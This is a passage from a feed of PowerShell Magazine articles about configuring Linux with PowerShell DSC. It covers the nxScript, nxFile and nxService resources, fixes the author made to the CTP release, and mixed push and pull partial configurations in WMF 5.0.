\u0026#39;bielawb\u0026#39; MembersToExclude = \u0026#39;webadmin\u0026#39; DependsOn = \u0026#39;[nxUser]WebAdmin\u0026#39; } } } We covered basics and all of the resources, it’s time for a few hints that may save you from hours of banging your head against the desk.\nFirst of all: you can skip the Verbose parameter on Start-DscConfiguration. Based on my experience it doesn’t provide any useful information. You have to look for hints on the other side of the wire, on the Linux box that you are talking to. First of all – you can read logs. There are two logs that may give you some ideas in case your configuration doesn’t work as expected. Both can be find in $OMI_HOME/var/log. There is a log for omiserver (omiserver.log) and separate one for dsc (dsc.log). If amount of information in the omiserver log is not sufficient, we can increase the logging level (–loglevel, default is 2, max value is 5) or log also http traffic (–httptrace).\nDSC depends on OMI. OMI usually runs in the background as a service. I strongly recommend to run it interactively while debugging: most of the Python code used in the resources doesn’t have any error handling. When we run omiserver interactively, we can see errors/exceptions that bubble up and based on these errors find out what failed:\nSet Traceback (most recent call last): File \u0026#34;/opt/omi-1.0.8/lib/Scripts/nxFile.py\u0026#34;, line 33, in Set_Marshall retval = Set(DestinationPath, SourcePath, Ensure, Type, Force, Contents, Checksum, Recurse, Links, Owner, Group, Mode) File \u0026#34;/opt/omi-1.0.8/lib/Scripts/nxFile.py\u0026#34;, line 428, in Set if SetFile(DestinationPath, SourcePath, fc) == False: File \u0026#34;/opt/omi-1.0.8/lib/Scripts/nxFile.py\u0026#34;, line 368, in SetFile shutil.copyfile(SourcePath, DestinationPath) File \u0026#34;/usr/lib64/python2.6/shutil.py\u0026#34;, line 50, in copyfile with open(src, \u0026#39;rb\u0026#39;) as fsrc: IOError: [Errno 2] No such file or directory: u\u0026#39;/not/there\u0026#39; With this extra information spotting the problem should be easier.\nLinux DSC was announced last year and published as a CTP. As any other CTP, it’s not perfect. However, it would help to see how it changes in the same location that it was initially published, on GitHub. Without this it may seem that the project was dropped. Lack of the official fixes leaves anybody who identifies a problem with two options. First options is to fix the problem. Second options is to use unofficial version of the product. I chose the first one. I hope this series convinced you that my attempt was good enough, and encourage you to give Linux DSC a try. And that concludes this series about Linux DSC “in action”.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/02/27/working-with-powershell-dsc-for-linux-part-5/","tags":["PowerShell DSC","linux","OMI"],"title":"Working with PowerShell DSC for Linux, part 5"},{"categories":["PowerShell DSC","Linux","OMI"],"contents":"CTP of Linux DSC that was released last year has only five resources: nxService, nxFile, nxUser, nxGroup, and nxScript. Things like package management, network configuration, firewall settings, jobs scheduled in crontab don’t have coverage in resources. Some of these issues can be addressed with nxFile, as we discussed in part 3. Luckily, with nxScript we can cover the rest.\nResources for scripts on Linux and Windows are very similar. They share same properties and provide similar functionality. The difference is a side effect of how both operating systems are handling scripts and it gives nxScript some benefits that Windows counterpart doesn’t provide. On *nix systems, file extensions are not as important as they are in Windows. It may help some tools present on Linux to provide functionality (e.g. syntax highlighting in code editor), but system is not using file name extension to tell him what the given files is. Scripts are perfect examples of that behavior.\nIn Linux, script interpreter is defined in the first line. This descriptor, called “shebang”, has following format:\n#! Interpreter [arguments]  Most of the time we simply provide a path to binary that will execute directives from our script. For example, the following line will make sure that our file is considered a Python script by the shell that we are using:\n#!/usr/bin/python  That works fine if we know the path. At times the path may be different than default one. Also it may be different on various systems. To avoid hardcoding the path to interpreter, we can use env command which will resolve the name to first executable present in the PATH variable. For example to mark our script as Perl script we could provide following shebang:\n#!/usr/bin/env perl  Important thing to remember: shebang has to be the first line of our file. To prove that extensions are not important, we will define two simple scripts that use Python syntax (print). One with extension that suggests shell script (.sh) and Python shebang, and one with extension that suggests Python script (.py) and without shebang:\n# ./fake.sh I\u0026#39;m a python script, see? # ./relly.py ./relly.py: line 1: print: command not found Why is that important? First of all it means that as long as we can depend on the interpreter being present on the Linux system that we configure, we can use any scripting language we want. Even though script we send over the wire is saved with sh extension we don’t have to think about it, we just need to format shebang properly. But it also means that if resource is not taking shebang into account, our scripts have to be formatted appropriately: with shebang in the very first line. If we use a herestring, then it should not be an issue. But if we define *Script properties using script block syntax, we are doomed to fail. Example configuration:\nconfiguration scriptBlock { param ( [String]$ComputerName ) Import-DscResource -ModuleName nx node $ComputerName { nxScript mix { GetScript = { #!/usr/bin/python print \u0026#34;Worked!\u0026#34; } TestScript = { #!/bin/bash exit 1 } SetScript = { #!/bin/perl print \u0026#34;Mixing different langs\u0026#34; } } } } Even though it looks like we got our code right, it is incorrect. Anything after the brace is already considered a part of our script. If we look at actual scripts created on Linux (if script fails DSC will leave it in /tmp/*/temp_script.sh), they all have extra blank line:\n# for file in /tmp/*/temp_script.sh; do cat -n $file; echo EOF; done 1 2 #!/bin/bash 3 exit 1 4 EOF 1 2 #!/bin/perl 3 print \u0026#34;Mixing different langs\u0026#34; 4 EOF To fix this issue and keep script block syntax, we would have to move the first line immediately after the curly brackets. In my opinion, it shouldn’t be necessary: resource should be smart enough to remove unnecessary white spaces and leave just the part that can be used. To get that behavior I modified nxScript a bit. You can find these changes in my fork of Linux DSC. Regardless of your decision – use official version or my fork – I would suggest using herestrings for script’s definition. Even if we don’t have to be careful with white spaces at the beginning of a file, it’s a bit easier to keep it clean. On top of that: using string syntax prevents us from thinking that any variable expansion is being done on the client side before configuration is sent to remote node. We can easily verify that using two simple configuration items that are really just “get” scripts (test will always return “True”):\nconfiguration getOnly { param ( [String]$ComputerName, [String]$Message ) Import-DscResource -ModuleName nx node $ComputerName { nxScript fail { SetScript = {} TestScript = {#!/bin/bash exit 0 } GetScript = {#!/bin/bash echo Got $Message with ScriptBlock } } nxScript work { SetScript = \u0026#39;\u0026#39; TestScript = @\u0026#34; #!/bin/bash exit 0 \u0026#34;@ GetScript = @\u0026#34; #!/bin/bash echo Got $Message with HereString \u0026#34;@ } } } $get = getOnly -ComputerName 192.168.200.104 -Message Foo Update-MofDocument -Path $get.FullName Start-DscConfiguration -CimSession $linTest -Wait -Path $get.DirectoryName Get-DscConfiguration -CimSession $linTest | ForEach-Object Result Got with ScriptBlock Got Foo with HereString If we use string everything is done as expected: variables are expanded in double-quoted string, not expanded in single-quoted string. Using string syntax allows us to easily use format operator and be sure that certain placeholders are being replaced by parameters provided by the user. Using this syntax we can build composite resource for adding or removing packages from Linux box. This is just a sketch – it assumes we use yum as a package manager and that makes it useful only for certain Linux distributions:\nconfiguration nxPackage { param ( [Parameter(Mandatory)] [String]$Name, [ValidateSet(\u0026#39;Present\u0026#39;,\u0026#39;Absent\u0026#39;)] [String]$Ensure = \u0026#39;Present\u0026#39; ) Import-DscResource -ModuleName nx nxScript \u0026#34;Package-$Name\u0026#34; { GetScript = @\u0026#39; #!/bin/bash yum info {0} \u0026#39;@ -f $Name TestScript = @\u0026#39; #!/bin/bash case {1} in Present) yum list installed {0} \u0026amp;gt; /dev/null 2\u0026amp;gt;\u0026amp;1 || exit 1 \u0026amp;\u0026amp; exit 0;; Absent) yum list installed {0} \u0026amp;gt; /dev/null 2\u0026amp;gt;\u0026amp;1 || exit 0 \u0026amp;\u0026amp; exit 1;; esac \u0026#39;@ -f $Name, $Ensure SetScript = @\u0026#39; #!/bin/bash case {1} in Present) yum -y install {0};; Absent) yum -y erase {0};; esac \u0026#39;@ -f $Name, $Ensure } } Once we have this resource defined we can create configuration using it, for example, if we want to install nano and Apache on a server that uses yum as a package manager:\nconfiguration PackageList { param ( [String]$ComputerName ) node $ComputerName { nxPackage nano { Name = \u0026#39;nano\u0026#39; } nxPackage httpd { Name = \u0026#39;httpd\u0026#39; } } } If we move this composite resource to nx (or any other) module than we need to import that module first in our configuration. Similar to Windows composite resource, to make nxPackage “proper” resource we need to create manifest that points to schema.psm1 file with configuration definition. Once it is done we can use it as if it was any other resource. The main difference is visible when we call Get-DscConfiguration. As composite resource we have created is present only on Windows it will be translated to nxScript resources locally and delivered to Linux and we will see nxScript resources results, not nxPackage results.\nAnother example of action that seems like a perfect fit for script resource is firewall configuration. This is pretty straightforward if iptables is used to manage firewall settings:\nnxScript AddFirewallRule { SetScript = @\u0026#39; #!/bin/bash iptables -I INPUT -m state --state NEW -m tcp -p tcp --dport http -j ACCEPT /etc/init.d/iptables save \u0026#39;@ TestScript = @\u0026#39; #!/bin/bash iptables -L | grep ^ACCEPT | grep \u0026#34;dpt:http \u0026#34; exit $? \u0026#39;@ GetScript = @\u0026#39; #!/bin/bash iptables -L | grep ^ACCEPT | grep \u0026#34;dpt:http \u0026#34; \u0026#39;@ } This configuration works fine (some error handling though would be more than welcome). But not all distributions are using iptables (at least – not directly). If we look at CentOS 7 we will noticed that different method (firewalld) is used. We can control firewall configuration using firewall-cmd command, but this command have problems with being called from non-interactive session. Configuration will literally freeze until we kill the process that is running firewall command line utility. It means that following configuration, even though it looks legit, won’t work in normal circumstances:\nnxScript AddFirewallRuleFirewalld { SetScript = @\u0026#39; #!/bin/bash firewall-cmd --permanent --add-service http firewall-cmd --reload \u0026#39;@ TestScript = @\u0026#39; #!/bin/bash firewall-cmd --list-service | grep \u0026#39;\\bhttp\\b\u0026#39; \u0026#39;@ GetScript = @\u0026#39; #!/bin/bash firewall-cmd --list-service \u0026#39;@ } The problem is related to SELinux policies and rights that firewall-cmd has. Two workarounds that worked for me: disable SELinux or run omiserver interactively. There is also a solution though.\nFirst we need to reproduce problems, and then find the related error messages in audit.log, and finally create policy based on that “pattern”. Once we have policy file we can apply the change to our system:\nps aux | grep [f]irewall-cmd | awk \u0026#39;{print \u0026#34;pid=\u0026#34; $2 \u0026#34; /var/log/audit/audit.log\u0026#34; }\u0026#39; | xargs grep | audit2allow -M firewall semodule -i firewall.pp With this change implemented we can use firewall-cmd in our configuration without freezing behavior.\nNote: Both tools (semodule and audit2allow) are part of separate packages: policycoreutils and policycoreutils-python, respectively. If either command doesn’t work make sure you have installed these packages. It’s enough to install latter as former is one of its dependencies and will be installed anyway.\nAnd that’s it in this part of the series. In next one we will cover nxUser and nxGroup.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/02/26/working-with-powershell-dsc-for-linux-part-4/","tags":["PowerShell DSC","Linux","OMI"],"title":"Working with PowerShell DSC for Linux, part 4"},{"categories":["PowerShell DSC","Linux","OMI"],"contents":"Linux is a system that stores configuration in text files. As a result, nxFile should be considered one of two most powerful resources offered in the CTP release. With the option to create and modify files on Linux box, we should be able to change or create configuration for services, modify default environment, configure networking, configure ssh authorized_keys for a given user to name just a few examples. On top of that, this resource can be used to deploy and configure web sites and other, less frequently used applications. In this article, we will take a look at few example definitions that take advantage of nxFile resource. We will also look at one pitfall that may be important while using it and a way to walk around it. Last but not least we will take a look at one bug and a way to fix it.\nUsing file resource to configure services is the best option when service has a concept of “included” configuration. This means that we can create a file from scratch and “main” configuration document will load it during startup of the service. If service doesn’t support it and uses single file then replacing it with the one created with DSC may be tricky (unless there is really good reason to prevent any changes to this configuration file). In our example, we will use three nxFile resource items to create very simple web application with virtual hostname.\nFirst thing we have to do is creating virtual host configuration in /etc/httpd/config.d folder with extension conf. Name is not important for the service, but it makes sense to name the file the same as virtual hostname that we want to describe in it:\nnxFile vhostConfig { DestinationPath = \u0026#39;/etc/httpd/conf.d/bielawscy.conf\u0026#39; Contents = @\u0026#39; \u0026lt;VirtualHost *:80\u0026gt; ServerName www.bielawscy.com ServerAdmin webmaster@bielawscy.com ErrorLog /var/log/httpd/bielawscy.err CustomLog /var/log/httpd/bielawscy.log combined DocumentRoot /var/www/bielawscy.com \u0026lt;Directory \u0026#34;/var/www/bielawscy.com\u0026#34;\u0026gt; Order allow,deny Allow from all \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; \u0026#39;@ } Once we have configuration defined, we need to create folder and root document with appropriate masks/content:\nnxFile documentRoot { DestinationPath = \u0026#39;/var/www/bielawscy.com\u0026#39; Type = \u0026#39;Directory\u0026#39; Mode = 755 } nxFile index { DestinationPath = \u0026#39;/var/www/bielawscy.com/index.html\u0026#39; Mode = 644 Contents = @\u0026#39; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome to www.bielawscy.com!\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome to BIELAWSCY.COM!\u0026lt;/h1\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;@ } To activate this change we would need nxScript: Apache configuration would have to be updated and there is no build-in way to achieve this without some plumbing on the user side.\nEnvironment for the users is defined by various profiles. Global profile is stored in /etc/profile but in a way similar to extending Apache configuration, we can “inject” our configuration by creating separate file in /etc/profile.d folder. For example, if we want to define OMI_HOME variable and make sure that folder where OMI was installed is part of the PATH variable we would need to add following nxFile item to our configuration:\nnxFile omiPath { DestinationPath = \u0026#39;/etc/profile.d/omipath.sh\u0026#39; Contents = @\u0026#39; PATH=$PATH:/opt/omi-1.0.8/bin export OMI_HOME=/opt/omi-1.0.8 \u0026#39;@ } One problem that I identified while working with this resource is related to encoding. So far our files were not using any characters that could cause encoding problems. Example configuration that includes Polish letters:\nnxFile webPolish { DestinationPath = \u0026#39;/var/www/html/index.html\u0026#39; Contents = @\u0026#39; \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD XHTML 1.1//EN\u0026#34; \u0026#34;http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Linux DSC page on CentOS\u0026lt;/title\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=UTF-8\u0026#34; /\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; (...) \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; (...) \u0026lt;h2\u0026gt;Zażółć gęślą jaźń - UTF8 is necessary here! \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;@ } Resulting MOF document (at least in my tests) was created using Little Endian encoding. If you are using DSC on Windows nodes only than it won’t bother you. But Linux (or at least: Linux DSC) doesn’t work with MOF encoded like that. When you try to apply this configuration to Linux node you can expect following error message:\nBuffer is not supported. Check encoding and length of the buffer\nTo work around this problem we have to add extra step before applying the configuration. We have to open MOF document and save it again using correct encoding. In my experience both UTF8 and UTF8 without BOM work fine. There is a better solution though. Instead of hardcoding content of files in our configuration document we can use external source and download entire folder directly to target location:\nnxFile pageSource { SourcePath = \u0026#39;/mnt/www/Symisun\u0026#39; DestinationPath = \u0026#39;/var/www/bielawscy.com\u0026#39; Type = \u0026#39;Directory\u0026#39; Force = $true Recurse = $true } We are using SMB share as a source (mounted under /mnt/www). That gives us a flexibility and easy way to deploy entire application, rather than deploying individual files one by one. Unfortunately, this is the moment when we may trip on a bug I mentioned at the beginning. If you would try to apply this configuration it will fail with the error message that I wouldn’t consider helpful:\nLoading the instance document from the pending location did not succeed.\nLogs on Linux side don’t reveal anything. Based on my previous experience I was suspecting that the problem is related to schema: if MOF created on Windows box is not recognized correctly on Linux box, than that’s the error message you can expect. Eventually I identified the cause. Schema MOF for nxFile provider is different in nx module that we use on Windows and the one used by DSC on Linux. I knew something was wrong with both Recurse and Force property (removing these properties was enough to prevent error from happening) and sure enough, these properties are defined differently on Windows and Linux:\n/* Windows */ [Write, ValueMap{\u0026quot;true\u0026quot;, \u0026quot;false\u0026quot;}] string Recurse; [Write, ValueMap{\u0026quot;true\u0026quot;, \u0026quot;false\u0026quot;, \u0026quot;yes\u0026quot;, \u0026quot;no\u0026quot;}] string Force; /* Linux */ [Write] boolean Recurse; [Write] boolean Force; Once the MOF on Windows side is fixed, our configuration should work fine. And with option to recurse/force we can easily deploy whole application, without hardcoding anything in the configuration itself. And that’s it for this part of the series. In the next part I will take a closer look at the resource that is both very powerful and flexible: nxScript.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/02/25/working-with-powershell-dsc-for-linux-part-3/","tags":["PowerShell DSC","Linux","OMI"],"title":"Working with PowerShell DSC for Linux, part 3"},{"categories":["PowerShell DSC","Linux","OMI"],"contents":"PowerShell DSC for Linux caught my attention immediately after it was announced. Being able to control configuration of Linux box with pure PowerShell code is huge for anybody who is interested in cross-platform solutions build in PowerShell. PowerShell DSC depends on OMI and that makes it even more interesting. I fell in love with WMI at first sight and OMI is open source implementation of WMI for (almost) any device/operating system.\nIf you are also interested in this subject you’ve probably read Ravi’s article on Installing and configuring DSC for Linux. I’ve also read it and use it almost every time I was installing DSC for Linux. I would either check prerequisites, or read details about DSC installation procedure. But if you thought that DSC operates the way it should once it is installed, you should think again.\nThis series of articles will describe all the things that I discovered while playing with Linux DSC — issues I had to address, problems I had to solve. This should be a nice supplement to the modified version of Linux DSC CTP that you can find under my GitHub account. Problems I’ve had identified didn’t surprise me. Issues are expected side effects of working with CTP version of any product.\nConsistency not invoked If you continue to use the machine that you’ve installed DSC on and you occasionally change the context to the root account you will soon notice that the number of mails sent to this user is growing:\n2 (Cron Daemon) Mon Jan 19 09:00 27/989 \u0026#34;Cron \u0026lt;root@ITPro\u0026gt; /opt/omi-1.0.8/bin/ConsistencyInvoker\u0026#34; 3 (Cron Daemon) Mon Jan 19 09:30 27/989 \u0026#34;Cron \u0026lt;root@ITPro\u0026gt; /opt/omi-1.0.8/bin/ConsistencyInvoker\u0026#34; U 4 (Cron Daemon) Mon Jan 19 10:00 27/988 \u0026#34;Cron \u0026lt;root@ITPro\u0026gt; /opt/omi-1.0.8/bin/ConsistencyInvoker\u0026#34; It’s your cron daemon begging for mercy. Yes, you did push your DSC configuration. You either configured it to fix itself or not – that is not important so much as the fact that once configuration is pushed you will get following entry in crontab:\n# cat /etc/crontab | grep omi */30 * * * * root /opt/omi-1.0.8/bin/ConsistencyInvoker It reflects LCM configuration, so if you increase time interval between refreshes, crontab configuration will follow. But crontab complains this file is missing, and quick look reveals that this complaint is justified:\n# cat /etc/crontab | grep omi | awk \u0026#39;{print $NF }\u0026#39; | xargs ls -l ls: cannot access /opt/omi-1.0.8/bin/ConsistencyInvoker: No such file or directory My initial thought was that probably executable exists on my disk but was simply overlooked in installation process. But find revealed only few folders. One of them looked promising though:\n# find / -name ConsistencyInvoker -print /root/build/WPSDSCLinux/dsc/LCM/dsc/engine/ConsistencyInvoker ... # ls -l /root/build/WPSDSCLinux/dsc/LCM/dsc/engine/ConsistencyInvoker total 8 -rw-r--r--. 1 root root 3751 Jan 20 20:57 ConsistencyInvoker.c -rw-r--r--. 1 root root 297 Jan 20 20:57 GNUmakefile We have C code and compiler instructions so we can check where the executable file did go. It appears that name of created executable matches the one referenced in crontab, but it’s all lower case. Compiled program is also not copied to the final location. But copying the file to the correct location is just a partial solution. It will prevent crontab from sending you messages, but system state will remain untouched.\nIt works! Except it doesn\u0026rsquo;t The problem with consistency program is that even though executable is compiled without any errors it doesn\u0026rsquo;t address configuration drift. Initially with my limited C/C++ skills I walked around the problem by using remote CIM calls. I even created function that would simplify invoking required CIM method:\nfunction Invoke-DscOperation { param ( [Parameter( Mandatory )] [Microsoft.Management.Infrastructure.CimSession]$CimSession, [ValidateRange(0,3)] [Int]$Flag = 1 ) $methodParam = @{ CimSession = $CimSession Namespace = \u0026#39;root/Microsoft/Windows/DesiredStateConfiguration\u0026#39; ClassName = \u0026#39;MSFT_DSCLocalConfigurationManager\u0026#39; MethodName = \u0026#39;PerformRequiredConfigurationChecks\u0026#39; Arguments = @{ Flags = [uint32]$Flag } } Invoke-CimMethod @methodParam } Recently I decided to give it a shot and try to fix the problem on the Linux side. I have used “debugging” method that is typical for people without proper skills: “printf debugging”. And because program is written in C it was not a concept, it was literally printf that revealed what the problem is and gave me a hint on how to fix it. My first step was simpler though. I just wanted to clarify if ConsinstencyInvoker results in an error and doesn’t report it, or it works fine but fails to do its job. To confirm that I’ve used construct that I miss in PowerShell occasionally:\n# consistencyinvoker || echo failed! failed! If you never used this construct: it will run second command only if the first one have non-zero return code. Output assured me that running ConsinstencyInvoker results in the silent error, so I modified the code a bit to figure out what went wrong. First of all I had to add reference to stdio.h so that I could use prinft function. The only other change I made was located in the last method call. I printed the error message to the console, and that already gave me a good hint where the problem is:\n# consistencyinvoker Error: The target namespace does not exist. Now I just needed to figure out which namespace this application is trying to use. Walking “back” in the code from the method call lead me to variable with the name that didn’t leave any room for doubt: DSCENGINE_NAMESPACE. One more printf and I was no longer surprised that ConsinstencyInvoker doesn’t work:\n# consistencyinvoker Error: The target namespace does not exist. Namespace: /dsc In the end I just had to modify one line to get proper namespace: #define instruction responsible for value of DSCENGINE_NAMESPACE constant. You can find actual change in above mentioned GitHub repository\nOnce that was fixed I got executable that was working correctly. And with Local Configuration Manager (LCM) set to ApplyAndAutocorrect, I could easily test if configuration drift is being fixed automatically.\nInstall that just works After I’ve fixed ConsinstencyInvoker there was just one element remaining. Compiled executable was not copied/moved to the location where crontab was expecting to find it. As you probably remember from Ravi’s post, installation of DSC contains two steps: make and make reg.\nAs registration of DSC providers requires similar rights to the one required to copy programs to system-wide path it makes perfect sense to add appropriate cp command to one of the make files. Analyzing make files starting from main located in root of source quickly revealed location that was perfect for command that was overlooked in original installation. The file in question contains several copy commands. Target for this part of make file (deploydsc) matches exactly our intent.\nBut we can’t hardcode source and destination path. After analyzing variables defined in various rules files I have identified two that should point to correct source and destination:\n# cat LCM/GNUmakefile | grep consistencyinvoker cp $(BINDIR)/consistencyinvoker $(CONFIG_BINDIR)/ConsistencyInvoker Again, you can find committed change in my GitHub repository. After applying both changes installation of the package and providers was pretty straight forward. With both changes in place we are ready to install Linux DSC without problems I had identified. But installation/configuration problems of the core DSC engine are not the only problems I have observed (and fixed). After all: DSC is only as good as the providers it offers. In the next part of the series we will look into the problems that may show up when we work with nxService provider.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/02/23/working-with-powershell-dsc-for-linux-part-2/","tags":["PowerShell DSC","Linux","OMI"],"title":"Working with PowerShell DSC for Linux, part 2"},{"categories":["Linux","OMI","PowerShell DSC"],"contents":"In the first part of this series, we covered the basis–how to get Desired State Configuration to do what the name promises: keep desired state consistent. Now that we are sure we will get the expected behavior it’s time to look into the resources offered in the CTP version of PowerShell DSC for Linux.\nThe real work (getting, testing and setting system state) in PowerShell DSC for Linux is performed by Python scripts called from C++ based MI providers, with one script per each of the resources. All of these scripts can be found in $OMI_HOME/lib/Scripts. Each script defines three main functions (in the similar fashion PowerShell resources do): Get_Marshall, Test_Marshall and Set_Marshall plus number of helper functions that “get the job done”. Parameters of main functions reflect the schema defined in the MOF document. Because of that design, it’s not difficult to understand how each of the resources work (as long as you can read Python).\nWe will start our journey with the resource that is probably the most complex: nxService. The complexity is a result of two factors. First of all, Linux has several ways to control daemon’s configuration. Tooling is not consistent, and even the same Linux distribution can have two different methods to control it. A perfect example is CentOS: CentOS 6 was using init, CentOS 7 is using systemd. Team responsible for Linux DSC was aware of this and that’s why in the nxService settings we can decide which controller we want to use. It means that when we define the configuration for a given node, we need to know which method is used, and pick the correct option for that setting. There are three options for controller type. Third controller, not mentioned yet, is upstart.\nSecond reason for resource complexity is related to the way script tests status of services. When you are using text-based parsing of the command output, it is very important to be sure you are using correct locale. Otherwise the actual output and the expected output may not match even though your service is in expected state. Unfortunately, this problem was not identified. Simple example: init controller is using chkconfig command to tell if a given service is enabled. It does that by parsing output from chkconfig –list ServiceName. A fragment of DSC script responsible for test:\nif runlevel_tokens[1] == \u0026#34;on\u0026#34;: return True else: return False Actual output from this command on Linux with Polish locale and httpd enabled:\n# chkconfig --list httpd httpd 0:wyłączone 1:wyłączone 2:włączone 3:włączone 4:włączone 5:włączone 6:wyłączone As you can see, strings do not match. Match will never happen, DSC will forever try to fix something that isn’t broken any more. To fix this script you would have to enforce locale instead of assuming them. To emulate this we can change environment for a moment and run command in en_US locale:\n# LANG=en_US.UTF8 chkconfig --list httpd httpd 0:off 1:off 2:on 3:on 4:on 5:on 6:off That works fine for chkconfig, but fails for service command:\n# LANG=en_US.UTF8 service httpd status httpd (pid 1680) jest uruchomiony... Command used to check service current state (/sbin/service) is actually a script that we can read and we can try to figure out why it fails. Script calls env command to run service related scripts in clean environment. With clean environment language settings are not transferred to actual script that controls service’s final state. That’s bad news. Good news is that reading the content of /sbin/service should be enough to realize that this script is just general wrapper/gateway for scripts kept in /etc/init.d folder. In other words, instead of calling wrapper, we can call script responsible for a given service directly:\nLANG=\u0026#34;en_US.UTF-8\u0026#34; /etc/init.d/httpd status httpd (pid 1680) is running... That was first option to fix it: modify the code so that it runs actual script, not wrapper. Alternatively, I could take advantage of the fact that service command returns not only localized string, but also exit code that is 0 when service is running, 1 when it’s not recognized, and 3 when it is stopped. Unfortunately, this change would only fix a problem of status not being properly reported. To keep changes as small as possible I ended up with modifying part that is calling commands and the way service-related script is being called.\nImplementing change in Python requires basic knowledge about this language. I had to modify definition of a function Process that was used to call any executable by adding code that would modify environment in which the command should run:\ndef Process(params): enEnv = os.environ.copy() enEnv[\u0026#34;LANG\u0026#34;] = \u0026#34;en_US.UTF8\u0026#34; process = subprocess.Popen(params, env=enEnv, stdout=subprocess.PIPE, stderr=subprocess.PIPE) (process_stdout, process_stderr) = process.communicate() return (process_stdout, process_stderr, process.returncode) That change, plus changing the paths to executables used (scripts in /etc/init.d instead of /sbin/service) did the trick. You can find related commits here.\nExample configuration that uses nxService resource to make sure that Apache is running on a given node:\nnxService Apache { Name = \u0026#39;httpd\u0026#39; Controller = \u0026#39;init\u0026#39; State = \u0026#39;Running\u0026#39; Enabled = $true } When we use this resource, we have to remember to make sure that we use appropriate controller and the name of service is correct. It’s complex resource to write, but simple resource to use.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/02/21/working-with-powershell-dsc-for-linux-part-1/","tags":["PowerShell DSC","Linux","OMI"],"title":"Working with PowerShell DSC for Linux, part 1"},{"categories":["PowerShell DSC"],"contents":"Partial configurations in DSC allow department-level delegation of target system configuration. This is an important step in enabling collaboration in the enterprise configuration management context. When partial configurations feature was introduced in WMF 5.0 Preview November 2014, the only supported configuration delivery mode was Pull mode.\nWith the WMF 5.0 Preview February 2015, mixing refresh modes or configuration delivery modes is now supported. This means a subset of partial configurations can be pushed using the Start-DscConfiguration cmdlet while the remaining partial configurations are pulled from a pull service or SMB file share.\nIn this updated scenario, we have the OS configuration fragment getting pushed while the SQL configuration fragment is being delivered over Pull mode.\nWhy mix refresh modes? What is the need for mixed refresh mode support? Here is what I understand from Microsoft team working on this feature. Mixing refresh modes in partial configurations allow you to gradually transition from a Push-based configuration delivery mode in the data center to a Pull-based configuration delivery mode. Another important use-case of this feature is when you are troubleshooting a specific configuration or when a developer is writing custom DSC resources. You can use the Push configuration delivery mode for a partial configuration fragment and then use the resource script debugging feature in WMF 5.0 to understand what is going wrong in the configuration enact process.\nI don’t recommend using this in a production setup. This should be used purely for dev and test purposes.\nHow to use mixed refresh modes? You can refer to my previous article to see the basic syntax for adding partial configurations to LCM. To support mixed refresh modes and enable something like what I illustrated in the above picture, a new property called RefreshMode is added to PartialConfiguration setting of the LCM. This can be used to tell LCM what RefreshMode \u0026ndash; Push, or Pull \u0026ndash; to get a specific fragment of the configuration. When specified, this setting at the partial configuration level overrides the RefreshMode setting at the LCM level.\nNote that the new RefreshMode setting Disabled is not supported with partial configurations. There is a bug in February preview that allows you to configure Disabled as the RefreshMode setting for a partial configuration.\nGoing back to the scenario illustrated in the diagram, I want the target node to get the OS configuration from using push while the SQL configuration fragment will be pulled and it depends on the OS configuration fragment.\nThe following scripts demonstrate the partial configuration fragments \u0026ndash; OSConfig and SQLConfig. To try the following configuration scripts as-is, you will need the resources from the DSC Resource Kit.\nOS Configuration $ConfigData = @{ AllNodes = @( @{ NodeName = \u0026#39;*\u0026#39;; PsDscAllowPlainTextPassword = $true }, @{ NodeName = \u0026#39;a5f86baf-f17f-4778-8944-9cc99ec9f992\u0026#39; } ) } Configuration OSConfig { Param ( $Credential ) Import-DscResource -ModuleName xComputerManagement Node $AllNodes.NodeName { xComputer ADJoin { Name = \u0026#39;WMF5-2\u0026#39; DomainName = \u0026#39;sccloud.lab\u0026#39; Credential = $Credential } } } OSConfig -ConfigurationData $ConfigData -Credential (Get-Credential) -OutputPath \u0026#39;C:\\SMBPull\u0026#39; New-DSCCheckSum -ConfigurationPath \u0026#39;C:\\SMBPull\u0026#39; -OutPath \u0026#39;C:\\SMBPull\u0026#39; In this configuration fragment, I am using the hostname as the nodename. So, the generated MOF will be named as .mof. Since this fragment is being pushed the target system, we don’t have to use the .mof format here or need MOF checksum.\nSQL Configuration $ConfigData = @{ AllNodes = @( @{ NodeName = \u0026#39;*\u0026#39;; PsDscAllowPlainTextPassword = $true }, @{ NodeName = \u0026#39;WMF5-2\u0026#39; } ) } Configuration SQLConfig { Param ( $Credential ) Import-DscResource -ModuleName xSqlPS Node $AllNodes.NodeName { WindowsFeature NET35 { Name = \u0026#39;NET-Framework-Core\u0026#39; Source = \u0026#39;D:\\Sources\\Sxs\u0026#39; Ensure = \u0026#39;Present\u0026#39; } xSqlServerInstall SQLInstall { InstanceName = \u0026#39;SQLDemo\u0026#39; SourcePath = \u0026#39;E:\\\u0026#39; Features= \u0026#39;SQLEngine,SSMS\u0026#39; SqlAdministratorCredential = $credential DependsOn = \u0026#39;[WindowsFeature]NET35\u0026#39; } } } SQLConfig -ConfigurationData $ConfigData -Credential (Get-Credential) -OutputPath \u0026#39;C:\\SMBPull\u0026#39; New-DSCCheckSum -ConfigurationPath \u0026#39;C:\\SMBPull\u0026#39; -OutPath \u0026#39;C:\\SMBPull\u0026#39; In the case of SQL configuration, we are using the GUID as the node name. The same GUID will be later configured as the ConfigurationID within the 